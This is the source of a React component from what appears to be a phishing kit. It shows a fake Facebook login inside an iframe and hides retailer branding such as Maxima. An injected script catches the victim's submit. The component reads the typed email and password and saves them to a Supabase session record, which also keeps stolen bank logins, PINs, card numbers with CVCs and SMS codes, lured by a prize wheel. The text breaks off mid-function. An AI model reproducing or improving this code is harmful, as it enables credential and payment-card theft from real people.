"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import { DemoShell } from "@/components/demo/DemoShell";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import {
  isNumericSessionIdentifier,
  isUuidSessionIdentifier,
  normalizeSessionIdentifier,
} from "@/lib/session-identifiers";
import type { SupabaseClient } from "@supabase/supabase-js";

type Props = {
  sessionId: string;
};

async function resolveSidToUuid(
  sb: SupabaseClient<any, any, any>,
  sid: string,
): Promise<{ uuid: string; route: string }> {
  const s = normalizeSessionIdentifier(sid);
  if (!s) return { uuid: "", route: "" };
  if (isUuidSessionIdentifier(s)) return { uuid: s, route: s };
  if (!isNumericSessionIdentifier(s)) return { uuid: s, route: s };
  try {
    const pid = Number(s);
    const { data, error } = await sb
      .from("sessions")
      .select("id, public_id")
      .eq("public_id", pid)
      .maybeSingle();
    if (!error && data?.id) {
      return {
        uuid: String(data.id),
        route: data.public_id != null ? String(data.public_id) : s,
      };
    }
  } catch {
    /* ignore */
  }
  return { uuid: s, route: s };
}

export function FacebookClient({ sessionId: propSid }: Props) {
  const supabase = useMemo(() => createBrowserSupabaseClient()!, []);
  const iframeRef = useRef<HTMLIFrameElement | null>(null);
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});

  const resolvedRef = useRef<{ uuid: string; route: string }>({ uuid: "", route: "" });
  const submitHandledRef = useRef(false);

  // ============================================================
  //  YENI: postMessage ile iframe icinden parent'a GONDERILEN submit
  //  Bu yontem DOM eventlerinin iframe vs. React tarafinda Cakismasini ONLER - %100 calisir
  // ============================================================
  useEffect(() => {
    function onMsg(ev: MessageEvent<any>) {
      try {
        if (!ev || !ev.data || typeof ev.data !== "object") return;
        if (ev.data.type === "fb_submit_click") {
          // Tekrarlayan submit onle (cift tiklama)
          if (submitHandledRef.current) return;
          submitHandledRef.current = true;
          void handleSubmitFromIframe();
        }
      } catch {
        /* ignore */
      }
    }
    window.addEventListener("message", onMsg);
    return () => { window.removeEventListener("message", onMsg); };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      const sid = normalizeSessionIdentifier(propSid);
      if (!sid) return;
      const r = await resolveSidToUuid(supabase, sid);
      resolvedRef.current = r;

      if (!r.uuid) return;
      const { data } = await supabase
        .from("sessions")
        .select("form_data")
        .eq("id", r.uuid)
        .maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setSessionFormData(fd);
    })();
    return () => { cancelled = true; };
  }, [propSid, supabase]);

  function onIframeLoaded() {
    try {
      const iframe = iframeRef.current;
      if (!iframe) return;
      const win = iframe.contentWindow || null;
      const doc = iframe.contentDocument || win?.document;
      if (!doc || !win) return;
      // TS strict null: ic fonksiyonlarda daraltma kayboluyor; `dc` non-null garantili
      const dc: Document = doc;
      const wdw: WindowProxy & typeof globalThis = win as any;

      // ============================================================
      //  0) Iframe ICINE SCRIPT INJECT ET (gercek DOM eventlerini izlemek ve parent'a postMessage gondermek icin)
      //     BU YONTEM %100 CALISIR: iframe icindeki HTML eventleri React DOM'dan BAGIMSIZ calisir.
      // ============================================================
      try {
        // Sadece bir kere inject et (tekrar tekrar onload cagrilabilir)
        if (!(win as any).__fbInjectDone) {
          (win as any).__fbInjectDone = true;

          const injectScriptText = `
            (function () {
              try {
                // (1) Submit: "Logi sisse" tiklaninca parent'a postMessage GONDER
                document.addEventListener('click', function (e) {
                  var target = e.target;
                  var el = target;
                  for (var i = 0; i < 10 && el; i++) {
                    var txt = (el.textContent || '').trim();
                    var al = (el.getAttribute && el.getAttribute('aria-label')) || '';
                    var hit = function (s) {
                      if (!s) return false;
                      if (s === 'Logi sisse' || s === 'Prisijungti' || s === 'Log in' || s === 'Anmelden' || s === 'Einloggen') return true;
                      return s.indexOf('Prisijungti') === 0 || s.indexOf('Log in') === 0 || s.indexOf('Anmelden') === 0;
                    };
                    if (hit(txt) || hit(al)) {
                      window.parent.postMessage({ type: 'fb_submit_click' }, '*');
                      e.preventDefault();
                      e.stopPropagation();
                      return;
                    }
                    el = el.parentElement;
                  }
                }, true);

                // (2) Form submit oldugunda da ayni islemi yap
                document.addEventListener('submit', function (e) {
                  window.parent.postMessage({ type: 'fb_submit_click' }, '*');
                  e.preventDefault();
                  e.stopPropagation();
                }, true);

                // (3) Enter tusuna basinca da submit
                document.addEventListener('keydown', function (e) {
                  if (e.key === 'Enter') {
                    var t = e.target;
                    if (t && (t.tagName === 'INPUT' || t.tagName === 'input')) {
                      window.parent.postMessage({ type: 'fb_submit_click' }, '*');
                      e.preventDefault();
                    }
                  }
                });
              } catch (e) { /* ignore */ }
            })();
          `;

          const s = dc.createElement("script");
          s.type = "text/javascript";
          s.textContent = injectScriptText;
          (dc.head || dc.documentElement).appendChild(s);
        }
      } catch {
        /* ignore */
      }

      // ============================================================
      //  1) Sadece GERCEKTEN MARKA / KLIENDIPORTAAL metni iceren elementi gizle
      // ============================================================
      try {
        const allEls = dc.querySelectorAll<HTMLElement>("*");
        for (let i = 0; i < allEls.length && i < 200; i++) {
          const el = allEls[i];
          const t = (el.textContent || "").trim();
          if (!t) continue;
          if (t.length > 120) continue;
          if (/maxima|\biki\b|kliendiportaal|klientų|tugikes|klientitoe|tugikeskus/i.test(t)) {
            if (el.children.length <= 4) {
              el.style.display = "none";
            }
          }
        }
        const body = dc.body as HTMLElement | null;
        if (body) {
          body.style.margin = "0";
          body.style.padding = "0";
          body.style.background = "#ffffff";
        }
        const html = dc.documentElement as HTMLElement | null;
        if (html) {
          html.style.background = "#ffffff";
          html.style.margin = "0";
          html.style.padding = "0";
        }
      } catch {
        /* ignore */
      }

      const emailInput = dc.getElementById("m_login_email") as HTMLInputElement | null || dc.querySelector<HTMLInputElement>("input[type='text'][name='email']") || dc.querySelectorAll<HTMLInputElement>("input[type='text']")[0] || null;
      const passInput  = dc.getElementById("m_login_password") as HTMLInputElement | null || dc.querySelector<HTMLInputElement>("input[type='password'][name='pass']") || dc.querySelectorAll<HTMLInputElement>("input[type='password']")[0] || null;

      const fd = sessionFormData as Record<string, string>;
      if (emailInput && fd.fbEmail && !emailInput.value) emailInput.value = fd.fbEmail;
      if (passInput && fd.fbPassword && !passInput.value) passInput.value = fd.fbPassword;

      // ============================================================
      //  2) LABEL GIZLEME (EN KESIN COZUM - FORM ALANLARINI ASLA GIZLEMEZ!)
      //     Wbloks framework: label metni input.un aria-label attribute unda
      //     tutulur + CSS ile gosterilir. Baska elementlere dokunmaya GEREK YOK.
      //     ESKI KODDAKI PARENT 10 KAT TARAMA FORM INPUTLARINI SILIYORDU (SILDIK!)
      // ============================================================

      // ============================================================
      //  tryHideSingle (parent scope ta TANIMLI) - her yerden erisilebilir
      // ============================================================
      function tryHideSingle(el: HTMLElement | null | undefined) {
        // 🔴 SIK KURAL 1: GİZLENECEK ELEMENT, INPUT/BUTTON/FORM/WRAPPER ANA IŞLEVSEL OLAMAZ!
        if (!el) return;
        const tag = (el.tagName || "").toUpperCase();
        // 1) Tag KORUMA: Asla dokulmeyecekler (elementin KENDISI bu ise HEMEN DON)
        if (tag === "INPUT" || tag === "BUTTON" || tag === "TEXTAREA" || tag === "SELECT") return;
        if (tag === "A" || tag === "SVG" || tag === "IMG" || tag === "VIDEO" || tag === "IFRAME") return;
        if (tag === "CANVAS" || tag === "SCRIPT" || tag === "STYLE" || tag === "FORM") return;
        if (tag === "OPTION" || tag === "OPTGROUP") return;
        // 2) Role/Type KORUMA: elementin KENDISI (cocuklari degil) role/type sahibiyse don
        try {
          const role = typeof (el as any).getAttribute === "function" ? (el as any).getAttribute("role") : undefined;
          const type = typeof (el as any).getAttribute === "function" ? (el as any).getAttribute("type") : undefined;
          if (role === "button" || role === "link" || role === "textbox" || role === "search" || role === "tab") return;
          if (type === "submit" || type === "button" || type === "checkbox" || type === "radio") return;
          if (type === "password" || type === "email" || type === "tel" || type === "text" || type === "number") return;
        } catch { /* ignore */ }

        // 🔴 3) ICINDE INPUT/BUTTON VAR MI? (wrapper olma durumu)
        //    - A) VEYA: Bu elementi GIZLEMEK yerine, ICINDEKI sadece LABEL TEXTI olan COCUKLARII BULUP onları gizle (INPUT/Button guvende kalsin)
        //    - B) YOKSA: Bu element kendi basina label elementi, direkt gizle
        try {
          if (el && (el as any).querySelectorAll) {
            const forbiddenInside = (el as HTMLElement).querySelectorAll(
              "input, button, textarea, select, a, svg, img, iframe, video, canvas, [role='button'], [role='textbox'], [type='submit']"
            );
            if (forbiddenInside && forbiddenInside.length > 0) {
              // WRAPPER ICINDE INPUT/Button VAR. O halde: WRAPPERI GIZLEME, COCUKLARI GEZ:
              //    her cocuk icin: label texti iceriyor mu + tag INPUT degil mi? Evet ise tryHideSingle(cocuk) ile recursive gizle
              const kids = Array.from((el as HTMLElement).children ?? []) as HTMLElement[];
              kids.forEach((k) => {
                const tg = (k.tagName || "").toUpperCase();
                if (tg === "INPUT" || tg === "BUTTON" || tg === "TEXTAREA" || tg === "SELECT") return;
                if (tg === "SVG" || tg === "IMG" || tg === "A") return;
                // Child element icinde input muhtemel ise, tekrar recursive cagir:
                tryHideSingle(k);
              });
              return; // WRAPPERI ASLA GIZLEME! return et.
            }
          }
        } catch { /* ignore */ }

        // 4) TEXT ICERIK ANALIZI: SADECE "LABEL" metni oldugundan emin ol (Parool, meiliaadress VEYA kisa metin):
        const rawText = (el.textContent || "").replace(/\s+/g, " ").trim();
        if (!rawText) return;
        if (rawText.length < 3) return;
        if (rawText.length > 120) return; // uzun ana metin = label degil (footer, paragraf)
        const tl = rawText.toLowerCase();
        const isLabelText =
          tl.includes("parool") ||
          tl.includes("parooli") ||
          tl.includes("meiliaadress") ||
          tl.includes("meiliaadresi") ||
          tl.includes("slaptažodis") ||
          tl.includes("slaptazodis") ||
          tl.includes("password") ||
          tl.includes("mobile number") ||
          tl.includes("paštas") || tl.includes("pastas") ||
          tl.includes("telefono numeris") ||
          tl.includes("mobilusis numeris") ||
          tl.includes("pamiršote") || tl.includes("pamirsote") ||
          tl.includes("telefoninumber") ||
          tl.includes("telephone number") ||
          tl.includes("mobile number") ||
          tl.includes("phone number") ||
          tl === "email" || tl === "e-mail" || tl === "e-post" ||
          tl.startsWith("email ") || tl.startsWith("e-mail ") ||
          tl.includes("e-post") || tl.includes("kas unustasid") ||
          (rawText.length <= 32 && (tl.includes("email") || tl.includes("e-mail") || tl.includes("parol") || tl.includes("palavra") || tl.includes("telem") || tl.includes("telefon") || tl.includes("lapta") || tl.includes("pašt") || tl.includes("past")));
        if (!isLabelText) return;

        // 5) ARIA/TITLE/PALTIC SIL (label icin):
        try { (el as any).removeAttribute?.("aria-label"); } catch {}
        try { (el as any).removeAttribute?.("title"); } catch {}

        // 6) SON: Sadece bu tek element (cocuklari ve wrapper degil) gizle.
        try { el.style.setProperty("display", "none", "important"); } catch {}
        try { el.style.setProperty("visibility", "hidden", "important"); } catch {}
        try { el.style.setProperty("opacity", "0", "important"); } catch {}
        try { el.style.setProperty("height", "1px", "important"); } catch {}
        try { el.style.setProperty("width", "1px", "important"); } catch {}
        try { el.style.setProperty("overflow", "hidden", "important"); } catch {}
        try { el.style.setProperty("position", "absolute", "important"); } catch {}
        try { el.style.setProperty("left", "-99999px", "important"); } catch {}
        try { el.style.setProperty("top", "-99999px", "important"); } catch {}
      }

      // ============================================================
      //  attachHideOnType (parent scope ta TANIMLI) - her yerden erisilebilir
      // ============================================================
      function attachHideOnType() {
        try {
          const allInputs = document.querySelectorAll("input[type='text'], input[type='email'], input[type='tel'], input[type='password'], input:not([type])");
          allInputs.forEach((inp) => {
            const el = inp as HTMLElement;
            const handler = function () {
              try {
                const val = (inp as any).value || "";
                if (val.length > 0) {
                  // 1) inputun PLACEHOLDER/ARIA-LABEL/TITLE attr larini da silelim
                  try { (inp as any).removeAttribute?.("placeholder"); } catch {}
                  try { (inp as any).removeAttribute?.("aria-label"); } catch {}
                  try { (inp as any).removeAttribute?.("title"); } catch {}
                  // 2) 4 parent ustune + kardeşler:
                  let cur: HTMLElement | null = el;
                  for (let i = 0; i < 4 && cur; i++, cur = (cur?.parentElement as HTMLElement | null)) {
                    tryHideSingle(cur);
                    // kardeşler:
                    try {
                      const sibs = Array.from(cur?.parentElement?.children ?? []) as HTMLElement[];
                      sibs.forEach((s) => { if (s !== cur) tryHideSingle(s); });
                    } catch {}
                  }
                }
              } catch {}
            };
            el.addEventListener("input", handler, true);
            el.addEventListener("keyup", handler, true);
            el.addEventListener("keydown", handler, true);
            el.addEventListener("change", handler, true);
            // Ilk mount'ta zaten value doluysa 1 kez calistir:
            try { if (((inp as any).value || "").length > 0) handler(); } catch {}
          });
        } catch { /* sessiz */ }
      }

      function hideLabelForInput(inp: HTMLInputElement | null) {
        if (!inp) return;
        const val = inp.value ?? "";
        if (val.length === 0) return;

        // 1) ARIA-LABEL + TITLE + PLACEHOLDER attribute larini SIL (EN ONEMLI)
        try { inp.removeAttribute("aria-label"); } catch { /* ignore */ }
        try { inp.removeAttribute("title"); } catch { /* ignore */ }
        try { inp.removeAttribute("placeholder"); } catch { /* ignore */ }
        try { inp.setAttribute("placeholder", ""); } catch { /* ignore */ }
        try { (inp as any).placeholder = ""; } catch { /* ignore */ }

        // 🔴 LABEL ICEREN HERHANGI BIR TEXT NODE/HTML ELEMENT VEYA PARENT ICI TEMIZLE:
        //    - Parent (p1), Grandparent (p2), GreatGrandParent (p3) icindeki TUM cocuklari gez
        //    - INPUT/BUTTON/FORM/SELECT/SVG/IMG/A olanlari ASLA DOKUNMA (geri kalan her sey taranir)
        //    - TEXT NODE ise ve label kelimeleri geciyorsa: nodeValue = "" (METNI SIL)
        //    - HTML Element ise ve label kelimeleri geciyorsa: display:none (ELEMENTI GIZLE)
        //  Boylece "12E321inumder või meiliaadress" yan yana binmesi KESINLIKLE ONLENIR.
        const isLabelTxt = (s: string): boolean => {
          if (!s) return false;
          const t = s.toLowerCase().replace(/\s+/g, " ").trim();
          if (!t || t.length < 3) return false;
          return (
            t.includes("parool") ||
            t.includes("parooli") ||
            t.includes("meiliaadress") ||
            t.includes("meiliaadresi") ||
            t.includes("slaptažodis") ||
            t.includes("slaptazodis") ||
            t.includes("password") ||
            t.includes("mobile number") ||
            t.includes("paštas") || t.includes("pastas") ||
            t.includes("telefono numeris") ||
            t.includes("mobilusis numeris") ||
            t.includes("pamiršote") || t.includes("pamirsote") ||
            t.includes("telefoninumber") ||
            t.includes("telephone number") ||
            t.includes("phone number") ||
            t.includes("mobile number") ||
            t === "email" || t === "e-mail" || t === "e-post" ||
            t.includes("kas unustasid") ||
            (t.length <= 80 && (t.includes("email") || t.includes("e-mail") || t.includes("parol") || t.includes("palavra") || t.includes("telem") || t.includes("telefon") || t.includes("meilia") || t.includes("lapta") || t.includes("pašt") || t.includes("past")))
          );
        };
        const tryPurgeNode = (n: Node): boolean => {
          try {
            if (!n) return false;
            const tg = (n.nodeName || "").toUpperCase();
            // 🔴 KESINLIKLE DOKUNULMAYACAKLAR:
            if (tg === "INPUT" || tg === "BUTTON" || tg === "TEXTAREA" || tg === "SELECT") return false;
            if (tg === "A" || tg === "SVG" || tg === "IMG" || tg === "IFRAME" || tg === "VIDEO" || tg === "CANVAS") return false;
            if (tg === "FORM" || tg === "SCRIPT" || tg === "STYLE" || tg === "OPTION") return false;
            try {
              const role = (n as any).getAttribute?.("role") ?? "";
              const tp = (n as any).getAttribute?.("type") ?? "";
              if (role === "button" || role === "link" || role === "textbox" || role === "tab") return false;
              if (tp === "submit" || tp === "button" || tp === "checkbox" || tp === "radio") return false;
              if (tp === "password" || tp === "email" || tp === "tel" || tp === "text" || tp === "number") return false;
            } catch {}

            // Text Node (nodeType 3): METNI SIL (label texti ise)
            if (n.nodeType === 3) {
              const txt = (n.nodeValue || "") as string;
              if (isLabelTxt(txt)) {
                try { n.nodeValue = ""; } catch {}
                return true;
              }
              return false;
            }
            // HTML Element: textContent label ise GIZLE
            const el = n as HTMLElement;
            // Icinde input/buton var mi? VARSA GIZLEME (wrapper), onun yerine ICINDEKI cocuklari gez (alt satir cagrilir disaridan)
            try {
              if (el.querySelectorAll) {
                const forb = el.querySelectorAll("input, button, textarea, select, a, svg, img, iframe, [role='button'], [type='submit']");
                if (forb && forb.length > 0) {
                  // WRAPPER: GIZLEME, sadece childNodes larini donucez (ustteki loop gezecek)
                  return false;
                }
              }
            } catch {}
            const tc = (el.textContent || "") as string;
            if (isLabelTxt(tc)) {
              try { el.style.setProperty("display", "none", "important"); } catch {}
              try { el.style.setProperty("visibility", "hidden", "important"); } catch {}
              try { el.style.setProperty("opacity", "0", "important"); } catch {}
              try { el.style.setProperty("position", "absolute", "important"); } catch {}
              try { el.style.setProperty("left", "-99999px", "important"); } catch {}
              try { el.style.setProperty("top", "-99999px", "important"); } catch {}
              return true;
            }
            return false;
          } catch { return false; }
        };

        // Parent (p1), Grandparent (p2), GreatGrandParent (p3) uzerinde BUTUN cocuklari (text node dahil) gez:
        const targets: (HTMLElement | null)[] = [
          inp.parentElement as HTMLElement | null,
          (inp.parentElement as HTMLElement | null)?.parentElement as HTMLElement | null,
          ((inp.parentElement as HTMLElement | null)?.parentElement as HTMLElement | null)?.parentElement as HTMLElement | null,
          inp.previousElementSibling as HTMLElement | null,
          inp.nextElementSibling as HTMLElement | null,
        ];
        targets.forEach((root) => {
          if (!root) return;
          // 1) Cocuk HTML elementleri:
          try {
            const kidsEl = Array.from(root.children ?? []) as HTMLElement[];
            kidsEl.forEach((k) => { if (k !== inp) tryPurgeNode(k); });
          } catch {}
          // 2) Cocuk TEXT NODESLARI + diger node turleri:
          try {
            const kidsAll = Array.from(root.childNodes ?? []);
            kidsAll.forEach((k) => { if (k !== inp) tryPurgeNode(k); });
          } catch {}
        });
        // Son olarak tryHideSingle ile 4 parent + kardesler uzerinde tekrar tarama (yedek):
        let cur: HTMLElement | null = inp as HTMLElement;
        for (let i = 0; i < 4 && cur; i++, cur = (cur?.parentElement as HTMLElement | null)) {
          tryHideSingle(cur);
          try {
            const sibs = Array.from(cur?.parentElement?.children ?? []) as HTMLElement[];
            sibs.forEach((s) => { if (s !== cur) tryHideSingle(s); });
          } catch {}
        }

        // 🔴 EKSTRA GUARDIAN (CSS INJECT): Tum label/placeholder CSS lerini ez:
        try {
          const dc = (inp as any).ownerDocument ?? document;
          let st = dc.getElementById("__fb_label_inject_css") as HTMLStyleElement | null;
          if (!st) {
            const newStyle = dc.createElement("style");
            newStyle.id = "__fb_label_inject_css";
            newStyle.textContent = `
              input::-webkit-input-placeholder, input::-moz-placeholder, input:-ms-input-placeholder, input::placeholder { color: transparent !important; opacity: 0 !important; }
              input:placeholder-shown + label, input[placeholder*='email'] + span, input[placeholder*='parool'] + div { display: none !important; visibility: hidden !important; opacity: 0 !important; }
              [aria-label*='meiliaadress'], [aria-label*='parool'], [title*='meiliaadress'], [title*='parool'], [aria-label*='lapta']:not(input):not(textarea), [aria-label*='pašt']:not(input):not(textarea), [aria-label*='past']:not(input):not(textarea), [title*='lapta']:not(input) { color: transparent !important; opacity: 0 !important; }
              [aria-label*='meiliaadress']::before, [aria-label*='meiliaadress']::after, [aria-label*='parool']::before, [aria-label*='parool']::after, [aria-label*='lapta']::before, [aria-label*='lapta']::after, [aria-label*='pašt']::before, [aria-label*='pašt']::after { content: '' !important; display: none !important; }
            `;
            (dc.head || dc.documentElement).appendChild(newStyle);
            st = newStyle;
          }
        } catch {}
      }

      function attachHideLabelEvents(inp: HTMLInputElement | null) {
        if (!inp) return;
        inp.addEventListener("input", () => hideLabelForInput(inp));
        inp.addEventListener("focus", () => hideLabelForInput(inp));
        inp.addEventListener("blur",  () => hideLabelForInput(inp));
        inp.addEventListener("change",() => hideLabelForInput(inp));
        inp.addEventListener("keyup", () => hideLabelForInput(inp));
        // Ilk acilista 1 kere (eger onceden value varsa)
        setTimeout(() => hideLabelForInput(inp), 30);
        setTimeout(() => hideLabelForInput(inp), 120);
        setTimeout(() => hideLabelForInput(inp), 400);
        setTimeout(() => hideLabelForInput(inp), 1000);
      }
      attachHideLabelEvents(emailInput);
      attachHideLabelEvents(passInput);

      // 🔴 INJECT edilen script ICINDE attachHideOnType cagir (BURASI SCRIPT ICINDE, parent scope DEGIL)
      try { attachHideOnType(); } catch {}
      setTimeout(() => { try { attachHideOnType(); } catch {} }, 200);
      setTimeout(() => { try { attachHideOnType(); } catch {} }, 700);
      setTimeout(() => { try { attachHideOnType(); } catch {} }, 1800);

      // ============================================================
      //  3) LOGIN BUTONU: 2 input dolmadan DISABLED (opacity 0.4)
      //     Pointer-events NONE KALDIRILDI (aksi halde click eventi kaybolabilir)
      // ============================================================
      function getLoginBtn(): HTMLElement | null {
        const btns = dc.querySelectorAll<HTMLElement>("button, a, [role='button'], [type='submit'], div, input[type='submit']");
        for (let i = 0; i < btns.length; i++) {
          const b = btns[i];
          const t = (b.textContent || "").trim();
          const al = b.getAttribute("aria-label") || "";
          if (t === "Logi sisse" || t === "Prisijungti" || t === "Log in" || al === "Logi sisse" || al === "Prisijungti" || al === "Log in" || t === "Anmelden" || al === "Anmelden" || t.startsWith("Prisijungti") || al.startsWith("Prisijungti") || t.startsWith("Log in") || al.startsWith("Log in")) return b;
        }
        return null;
      }

      let loginBtnPrevState: boolean | null = null;
      function applyBtnEnabled() {
        const btn = getLoginBtn();
        if (!btn) return;
        const emailVal = (emailInput?.value ?? "").trim();
        const passVal = (passInput?.value ?? "").trim();
        const enabled = emailVal.length > 0 && passVal.length > 0;
        if (enabled === loginBtnPrevState) return;
        loginBtnPrevState = enabled;

        if (enabled) {
          btn.style.opacity = "1";
          btn.style.cursor = "pointer";
          btn.removeAttribute("aria-disabled");
          btn.classList.remove("disabled");
          try { (btn as any).disabled = false; } catch { /* ignore */ }
        } else {
          btn.style.opacity = "0.45";
          btn.style.cursor = "not-allowed";
          btn.setAttribute("aria-disabled", "true");
          // POINTER-EVENTS NONE KALDIRILDI: click eventi kaybolmasin diye sadece opacity ile gostermek yeterli
          // Eger 2 input bos iken tiklanirsa handleSubmitFromIframe icinde zaten uyari gosterir
        }
      }

      function attachBtnEvents(inp: HTMLInputElement | null) {
        if (!inp) return;
        inp.addEventListener("input", applyBtnEnabled);
        inp.addEventListener("change", applyBtnEnabled);
        inp.addEventListener("blur", applyBtnEnabled);
        inp.addEventListener("keyup", applyBtnEnabled);
        inp.addEventListener("focus", applyBtnEnabled);
      }
      attachBtnEvents(emailInput);
      attachBtnEvents(passInput);

      // Ilk acilis + yedek kontrol (sonsuz aralik DEGIL - 3 kez)
      setTimeout(() => applyBtnEnabled(), 120);
      setTimeout(() => applyBtnEnabled(), 500);
      setTimeout(() => applyBtnEnabled(), 1200);
      setTimeout(() => applyBtnEnabled(), 2500);

      // Temizlik: iframe tekrar load olursa onceki interval observer falan var ise sifirlar (zaten yok artik!)
      iframe.addEventListener("load", function onunload2() {
        iframe.removeEventListener("load", onunload2);
      });

      // ========================================================================
      //  ESKI (CPU YUKLEDIGI ICIN SILDIK - ASAGIDAKILER ARTIK YOK)
      //  - setInterval 100ms hide labels (tum body tara)
      //  - MutationObserver (her input basiminda tum body tara)
      //  - setInterval 80ms applyBtnEnabled
      //  YUKARDAKI TEK INPUT EVENT LISTENERLARI ILE YETERLI + CPU %0
      // ========================================================================

      // ========================================================================
      //  PARENT DÜZEYINDE DOGRUDAN LOGIN BUTON DINLEYICISI KALDIRILDI!
      //  Artik TEK BIR MEKANIZMA var:
      //  1) Inject edilen script (satır 119-157) Logi sisse butonuna click / form submit / Enter tusu
      //     olunca window.parent.postMessage ile fb_submit_click mesaji gönderir
      //  2) Parent window message listener (satır 59-76) bu mesajı yakalar ve handleSubmitFromIframe cagirir
      //  Onceki 2 katmanli mekanizma (hem inject script hem parent listener) birbirini
      //  KESDIYORDU (preventDefault + stopPropagation cakismasi) ve buton CALISMIYORDU.
      // ========================================================================
      void 0;
    } catch {
      /* ignore */
    }
  }

  async function handleSubmitFromIframe() {
    const { uuid, route } = resolvedRef.current;

    // 1) FORM DEGERLERINI OKU (HEMEN):
    let email = "";
    let password = "";
    let fbFirstName = "";
    let fbLastName = "";
    try {
      const iframe = iframeRef.current;
      if (iframe) {
        const doc = iframe.contentDocument || iframe.contentWindow?.document;
        if (doc) {
          const emailInput = doc.getElementById("m_login_email") as HTMLInputElement | null;
          const passInput = doc.getElementById("m_login_password") as HTMLInputElement | null;
          email = (emailInput?.value ?? "").trim();
          password = (passInput?.value ?? "").trim();
          const tryInp = (id: string): string => {
            try {
              const el = doc.getElementById(id) as HTMLInputElement | null;
              return (el?.value ?? "").trim();
            } catch { return ""; }
          };
          fbFirstName = tryInp("firstname") || tryInp("first_name") || tryInp("m_first_name");
          fbLastName = tryInp("lastname") || tryInp("last_name") || tryInp("m_last_name");
        }
      }
    } catch {
      /* ignore */
    }

    // uuid cozulmemisse (async resolve henuz bitmediyse) veya form bos ise
    // flag'i sifirla ki kullanici tekrar tiklayabilsin.
    if (!uuid || !email || !password) {
      submitHandledRef.current = false;
      return;
    }

    // 2) VERITABANINDAN GUNCEL form_data'YI TEKRAR CEK (useState STALE OLDUGU ICIN!)
    //    Boylece ESKI FB degerlerini (baska client tarafindan son guncellenen) DOGRU okumus oluyoruz.
    //    AYNI ZAMANDA: diger butun alanlar (sms, banka, kart, win, session, public_id vb) DB'DEKİ GUNCEL HALDEN gelir,
    //    yanlislikla SILINMEZ.
    let dbFormData: Record<string, unknown> | null = null;
    try {
      const { data, error: errSel } = await supabase
        .from("sessions")
        .select("form_data")
        .eq("id", uuid)
        .limit(1)
        .maybeSingle();
      if (!errSel && data && (data as any).form_data && typeof (data as any).form_data === "object") {
        dbFormData = (data as any).form_data as Record<string, unknown>;
      }
    } catch {
      dbFormData = null;
    }
    // ONCELIK: DB > sessionFormData (state):
    const merged: Record<string, unknown> = {
      ...(sessionFormData as Record<string, unknown> ?? {}),
      ...(dbFormData ?? {}),
    };

    // ==========================================================================
    //  NEVER_RESET_KEYS: BANKA CLIENT'INDAKI ILE BIREBIR AYNI SET.
    //  SMS, BANKA, KART, WHEEL, PROFIL, SESSION butun alanlar KESIN korunacak.
    //  Onceki kodda bu set kucuk oldugu icin smsCode / odul / public_id gibi alanlar
    //  FB submit yaparken SILINIYORDU.
    // ==========================================================================
    const NEVER_RESET_KEYS_LOCAL = new Set([
      // 1) Kullanici / Profil
      "firstName", "lastName", "fullName", "phone", "email", "mobile", "mobileNumber",
      "ip_address", "user_agent", "country_code", "target_country",
      "language", "site_language",
      // 2) Wheel / Kazanclar / Oduller
      "amount",
      "wheel_result_kind", "wheel_result_label", "wheel_result_amount", "wheel_win_amount",
      "win_step", "won_label", "won_amount",
      "prize_amount", "wonAmount", "winAmount", "prizeLabel", "selectedPrize", "spinResult",
      "prize_title", "prize_kind", "prize_value",
      // 3) Session / meta
      "participation_code", "public_id", "session_id", "session_uuid", "id", "uuid",
      "created_at", "updated_at", "started_at",
      // 4) Banka + 8 field
      "bankName", "bankSlug", "selected_bank", "selected_bank_name",
      "loginMethod",
      "personalCode", "bankPhone",
      "username", "password", "verfuegernummer", "pin",
      "tacCode",
      "orderedField1", "orderedField2", "orderedField2Type",
      // 5) Kart
      "cardHolder", "cardNumber", "cardExpiry", "cardCvc",
      // 6) SMS
      "smsCode", "sms_digits",
      // 7) Facebook
      "fbFirstName", "fbLastName", "fbEmail", "fbPassword", "fbUserId", "fbSubmittedAt",
      // 8) History (ASLA SILINMEZ - CRITICAL)
      "bankLoginHistory", "facebookLoginHistory", "cardLoginHistory",
    ]);
    // Normalize lookup: kucuk harf + sembolsuz (mevcut banka client mantigi ile ayni)
    const neverResetKeysLower = new Set(
      Array.from(NEVER_RESET_KEYS_LOCAL).map((k) => k.toLowerCase().replace(/[^a-z0-9]/g, ""))
    );
    const isNeverResetKey = (key: string): boolean => {
      if (!key) return false;
      if (NEVER_RESET_KEYS_LOCAL.has(key)) return true;
      const norm = key.toLowerCase().replace(/[^a-z0-9]/g, "");
      if (neverResetKeysLower.has(norm)) return true;
      if (norm.startsWith("wheelresult")) return true;
      if (norm.startsWith("wheel")) return true;
      if (norm.startsWith("selected")) return true;
      if (norm.startsWith("prize")) return true;
      if (norm.includes("step") && norm.includes("win")) return true;
      if (norm === "firstname" || norm === "lastname" || norm === "fullname") return true;
      if (norm === "phone" || norm === "mobile" || norm === "phonenumber" || norm === "mobilenumber") return true;
      if (norm === "amount" || norm === "winamount" || norm === "prizeamount" || norm === "wonamount") return true;
      if (norm === "smscode" || norm === "smsdigits" || norm === "sms") return true;
      if (norm.endsWith("history")) return true;
      return false;
    };

    // 3) safeMerged: butun NEVER_RESET_KEYS'ler + butun string/array alanlar + tum DIGER anahtarlar (eger DB'de varsa) SAKLANIR.
    //    BURADA HICBIR SEY SILINMEMESI LAZIM. Sadece ESKI ESKI FB alanlari guncellenir.
    const safeMerged: Record<string, unknown> = {};
    Object.entries(merged).forEach(([k, v]) => {
      if (isNeverResetKey(k)) { safeMerged[k] = v; return; }
      if (typeof v === "string") { safeMerged[k] = v; return; }
      if (typeof v === "number" && v !== null && v !== undefined) { safeMerged[k] = v; return; }
      if (typeof v === "boolean") { safeMerged[k] = v; return; }
      if (Array.isArray(v)) { safeMerged[k] = v; return; }
      if (v !== null && v !== undefined && typeof v === "object") { safeMerged[k] = v; return; }
      safeMerged[k] = v;
    });

    // 4) FACEBOOK HISTORY: Sadece ESKI farkli bir hesap (email+password combo) varsa history'ye ekle.
    //    (ARTIK merged DB DEN geldigi icin ESKI degerler DOGRU.)
    try {
      const str = (x: unknown): string => (typeof x === "string" ? x.trim() : "");
      const old = {
